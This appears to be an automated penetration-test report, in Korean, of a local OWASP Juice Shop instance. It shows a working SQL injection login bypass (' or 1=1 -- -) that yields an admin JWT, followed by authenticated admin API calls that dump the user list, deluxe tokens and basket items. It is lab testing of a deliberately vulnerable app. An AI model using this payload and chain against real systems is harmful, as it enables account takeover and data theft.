# Pentest Report: 20260813-163913-juice-shop
## Summary

- 대상: 127.0.0.1
- 진행된 단계: exploitation, web_agent
- 총 findings: 11


## Exploitation

### 127.0.0.1

- **[성공]** port 3000 - SQL Injection (email, /rest/user/login) (방법: SQLi(local-known-payload))
  - 로컬 직접 검증 성공: ' or 1=1 -- -


## Web Post-Exploitation

### 127.0.0.1

#### 테스트 과정

1. `try_login_bypass(local-known-payload)` - 경로 `/rest/user/login`
```json
{
  "path": "/rest/user/login",
  "payload": "' or 1=1 -- -"
}
```

2. `list_users` - 경로 `/api/Users`
```json
{
  "path": "/api/Users"
}
```

3. `application_version` - 경로 `/rest/admin/application-version`
```json
{
  "path": "/rest/admin/application-version"
}
```

4. `basket_items` - 경로 `/api/BasketItems/`
```json
{
  "path": "/api/BasketItems/"
}
```

#### 상세 응답

1. `try_login_bypass(local-known-payload)` 응답
```
{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOC0xMyAwMzoxNDo1NC4xNDIgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOC0xMyAwMzoxNDo1NC4xNDIgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODY2MzkxNTR9.uGJn4-NNECDhGGbWhuy8SE5BpbfSQdBont4FUw-_maWv1L3V6GGxnzSOlztQAhRcTyRQtadpzQBmyymP6m7Nr504v6vUY8qBNMDCvxiuhro7DOmm11RuDuYSWKp4FjfJTYl6JiZjSGMBJhU5dgqTDAnhAlGcU10qcbyR0o4wLnE","bid":1,"umail":"admin@juice-sh.op"}}
```

2. `list_users` 응답
```
{"status":"success","data":[{"id":1,"username":"","email":"admin@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-08-13T03:14:54.142Z","updatedAt":"2026-08-13T03:14:54.142Z","deletedAt":null},{"id":2,"username":"","email":"jim@juice-sh.op","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.143Z","updatedAt":"2026-08-13T03:14:54.143Z","deletedAt":null},{"id":3,"username":"","email":"bender@juice-sh.op","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.143Z","updatedAt":"2026-08-13T03:14:54.143Z","deletedAt":null},{"id":4,"username":"bkimminich","email":"bjoern.kimminich@gmail.com","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-08-13T03:14:54.143Z","updatedAt":"2026-08-13T03:14:54.143Z","deletedAt":null},{"id":5,"username":"","email":"ciso@juice-sh.op","role":"deluxe","deluxeToken":"d715c2c75d4a42d3825a050e0a0163c1959b51165373f17bd8eed7b1e05bf20d","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.144Z","updatedAt":"2026-08-13T03:14:54.144Z","deletedAt":null},{"id":6,"username":"","email":"support@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-08-13T03:14:54.144Z","updatedAt":"2026-08-13T03:14:54.144Z","deletedAt":null},{"id":7,"username":"","email":"morty@juice-sh.op","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.144Z","updatedAt":"2026-08-13T03:14:54.144Z","deletedAt":null},{"id":8,"username":"","email":"mc.safesearch@juice-sh.op","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.144Z","updatedAt":"2026-08-13T03:14:54.144Z","deletedAt":null},{"id":9,"username":"","email":"J12934@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-08-13T03:14:54.144Z","updatedAt":"2026-08-13T03:14:54.144Z","deletedAt":null},{"id":10,"username":"wurstbrot","email":"wurstbrot@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-08-13T03:14:54.145Z","updatedAt":"2026-08-13T03:14:54.145Z","deletedAt":null},{"id":11,"username":"","email":"amy@juice-sh.op","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.145Z","updatedAt":"2026-08-13T03:14:54.145Z","deletedAt":null},{"id":12,"username":"","email":"bjoern@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/12.png","isActive":true,"createdAt":"2026-08-13T03:14:54.145Z","updatedAt":"2026-08-13T03:14:54.145Z","deletedAt":null},{"id":13,"username":"","email":"bjoern@owasp.org","role":"deluxe","deluxeToken":"efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4","lastLoginIp":"","profileImage":"assets/public/images/uploads/13.jpg","isActive":true,"createdAt":"2026-08-13T03:14:54.145Z","updatedAt":"2026-08-13T03:14:54.145Z","deletedAt":null},{"id":15,"username":"","email":"accountant@juice-sh.op","role":"accounting","deluxeToken":"","lastLoginIp":"123.456.789","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.145Z","updatedAt":"2026-08-13T03:14:54.145Z","deletedAt":null},{"id":16,"username":"","email":"uvogin@juice-sh.op","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.145Z","updatedAt":"2026-08-13T03:14:54.145Z","deletedAt":null},{"id":17,"username":"","email":"demo","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.145Z","updatedAt":"2026-08-13T03:14:54.145Z","deletedAt":null},{"id":18,"username":"j0hNny","email":"john@juice-sh.op","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.145Z","updatedAt":"2026-08-13T03:14:54.145Z","deletedAt":null},{"id":19,"username":"E=ma²","email":"emma@juice-sh.op","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.145Z","updatedAt":"2026-08-13T03:14:54.145Z","deletedAt":null},{"id":20,"username":"SmilinStan","email":"stan@juice-sh.op","role":"deluxe","deluxeToken":"8f70e0f4b05685efff1ab979e8f5d7e39850369309bb206c2ad3f7d51a1f4e39","lastLoginIp":"","profileImage":"assets/public/images/uploads/20.jpg","isActive":true,"createdAt":"2026-08-13T03:14:54.146Z","updatedAt":"2026-08-13T03:14:54.146Z","deletedAt":null},{"id":21,"username":"evmrox","email":"ethereum@juice-sh.op","role":"deluxe","deluxeToken":"b49b30b294d8c76f5a34fc243b9b9cccb057b3f675b07a5782276a547957f8ff","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.146Z","updatedAt":"2026-08-13T03:14:54.146Z","deletedAt":null},{"id":22,"username":"","email":"testing@juice-sh.op","role":"admin","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/defaultAdmin.png","isActive":true,"createdAt":"2026-08-13T03:14:54.146Z","updatedAt":"2026-08-13T03:14:54.146Z","deletedAt":null},{"id":23,"username":"","email":"basil@juice-sh.op","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","isActive":true,"createdAt":"2026-08-13T03:14:54.146Z","updatedAt":"2026-08-13T03:14:54.146Z","deletedAt":null}]}
```

3. `application_version` 응답
```
{"version":"20.1.1"}
```

4. `basket_items` 응답
```
{"status":"success","data":[{"ProductId":1,"BasketId":1,"id":1,"quantity":2,"createdAt":"2026-08-13T03:14:54.899Z","updatedAt":"2026-08-13T03:14:54.899Z"},{"ProductId":2,"BasketId":1,"id":2,"quantity":3,"createdAt":"2026-08-13T03:14:54.899Z","updatedAt":"2026-08-13T03:14:54.899Z"},{"ProductId":3,"BasketId":1,"id":3,"quantity":1,"createdAt":"2026-08-13T03:14:54.899Z","updatedAt":"2026-08-13T03:14:54.899Z"},{"ProductId":4,"BasketId":2,"id":4,"quantity":2,"createdAt":"2026-08-13T03:14:54.899Z","updatedAt":"2026-08-13T03:14:54.899Z"},{"ProductId":4,"BasketId":3,"id":5,"quantity":1,"createdAt":"2026-08-13T03:14:54.899Z","updatedAt":"2026-08-13T03:14:54.899Z"},{"ProductId":4,"BasketId":4,"id":6,"quantity":2,"createdAt":"2026-08-13T03:14:54.899Z","updatedAt":"2026-08-13T03:14:54.899Z"},{"ProductId":3,"BasketId":5,"id":7,"quantity":5,"createdAt":"2026-08-13T03:14:54.899Z","updatedAt":"2026-08-13T03:14:54.899Z"},{"ProductId":4,"BasketId":5,"id":8,"quantity":2,"createdAt":"2026-08-13T03:14:54.899Z","updatedAt":"2026-08-13T03:14:54.899Z"}]}
```

#### 최종 결과

- 상태: **[성공]**
- 판단: 로컬 Juice Shop에서 로그인 SQLi로 관리자 JWT를 획득했고, 인증된 관리자 API 접근까지 확인했다.
- 확인된 항목:
  - `list_users` / `/api/Users` / confirmed
  - `application_version` / `/rest/admin/application-version` / confirmed
  - `basket_items` / `/api/BasketItems/` / confirmed
- 로그인 우회 응답:
```
{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOC0xMyAwMzoxNDo1NC4xNDIgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOC0xMyAwMzoxNDo1NC4xNDIgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODY2MzkxNTR9.uGJn4-NNECDhGGbWhuy8SE5BpbfSQdBont4FUw-_maWv1L3V6GGxnzSOlztQAhRcTyRQtadpzQBmyymP6m7Nr504v6vUY8qBNMDCvxiuhro7DOmm11RuDuYSWKp4FjfJTYl6JiZjSGMBJhU5dgqTDAnhAlGcU10qcbyR0o4wLnE","bid":1,"umail":"admin@juice-sh.op"}}
```

